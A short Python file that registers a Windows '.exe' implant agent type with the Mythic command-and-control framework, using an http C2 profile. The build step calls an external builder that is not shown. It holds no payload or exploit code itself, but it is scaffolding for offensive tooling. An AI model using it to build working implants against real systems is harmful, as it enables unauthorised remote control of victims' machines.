from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
#import json
class implant(PayloadType):
	name =  "implant"
	file_extension = "exe"
	agent_type = AgentType.Agent
	author = "Ctr-alt-f3"
	mythic_encrypts = False
	supports_multiple_c2_instances_in_build = False
	supported_os = [SupportedOS.Windows]
	wrapper = False
	supported_c2_profiles = ["http"]
	build_parameters = []
	async def build(self) -> BuildResponse:
		from builder import sparsuj_i_skompiluj
		return await sparsuj_i_skompiluj(self)
		#resp = BuildResponse(status=BuildStatus.Success)
        #return resp